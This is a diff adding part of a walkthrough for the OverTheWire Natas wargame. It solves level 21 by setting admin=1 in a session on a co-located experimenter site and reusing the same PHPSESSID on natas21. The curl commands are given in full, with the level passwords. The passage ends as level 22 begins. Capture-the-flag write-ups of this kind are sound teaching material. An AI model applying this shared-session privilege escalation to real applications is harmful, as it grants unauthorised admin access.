@@ -2080,3 +2080,143 @@ Don't write your own session handler! (And if you do, use a secure, **non-inject
 Use CTRL + U to view the page source. And notice:
 
 ```html
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?>
+```
+
+Notice that there is no login mechanism at all!
+
+And notice `this website is colocated with`.
+
+*'Colocated'* means that both `natas21` and `natas21-experimenter` are running on the same server and use the same backend session storage.
+
+So if we can set `admin` to 1 in the session on `natas21-experimenter`, we might be able to access `natas21` and retrieve the credentials for natas22.
+
+We'll first try to set `admin` to 1 on `natas21-experimenter` by sending a request with the following header:
+```powershell
+curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -c cookies.txt "http://natas21-experimenter.natas.labs.overthewire.org/?admin=1&submit=1"
+```
+
+Then we'll try to access `natas21` with the same cookie:
+```powershell
+curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -b cookies.txt http://natas21.natas.labs.overthewire.org/
+```
+
+**But** we still get `You are logged in as a regular user.`!
+
+Let's check if `admin=1` is actually set for `natas21-experimenter`:
+```powershell
+curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -b cookies.txt "http://natas21-experimenter.natas.labs.overthewire.org/?debug=1"
+```
+
+And we do get:
+```text
+[DEBUG] Session contents:<br>Array
+(
+    [admin] => 1
+    [submit] => 1
+    [align] => center
+    [fontsize] => 100%
+    [bgcolor] => yellow
+)
+```
+
+So `admin=1` is successfully stored in the session of `natas21-experimenter`, but it is not visible when accessing `natas21`.
+
+This means that, although both applications use the same session storage, they are <u>**not** using the **same session ID**.</u>
+
+PHP sessions are linked to a session ID (`PHPSESSID`), which is stored in a cookie.
+
+When we interact with `natas21-experimenter`, it creates a session and stores `admin=1` in it. But when we then access `natas21`, it does not use that same session. Instead, it creates a new one.
+
+So even though both applications use the same session storage, they are not using the same session.
+
+This explains why our first attempt fails: the `admin=1` value is stored, but in a different session than the one `natas21` is using.
+
+So if we want this to work, we need to make sure both applications use the **exact same session ID**.
+
+---
+
+First, retrieve a session ID from `natas21-experimenter`:
+```powershell
+curl.exe -i -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH "http://natas21-experimenter.natas.labs.overthewire.org/"
+```
+
+From the response, extract the session ID:
+```text
+Set-Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4;
+```
+
+Now, set `admin=1` in that exact session for `natas21-experimenter`:
+```powershell
+curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -H "Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4" "http://natas21-experimenter.natas.labs.overthewire.org/?admin=1&submit=1"
+```
+
+Finally, use the **same session ID** on `natas21`:
+```powershell
+curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -H "Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4" "http://natas21.natas.labs.overthewire.org/"
+```
+
+Because both applications now use the same session ID, `natas21` now reads the session data set by `natas21-experimenter`, including `admin=1`.
+
+This grants admin access and reveals the credentials for `natas22`.
+
+The response from `natas21` is:
+```html
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+And the password for natas22 is `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`.
+
+#### The Lesson
+
+**Sharing session storage** across applications is dangerous when session IDs are shared between them.
+
+### Level 22
+
+- **Date**: 2026-04-05
+- **URL**: `http://natas22.natas.labs.overthewire.org`
+- **Password**: `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`
+- **Tools**: Web Browser, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
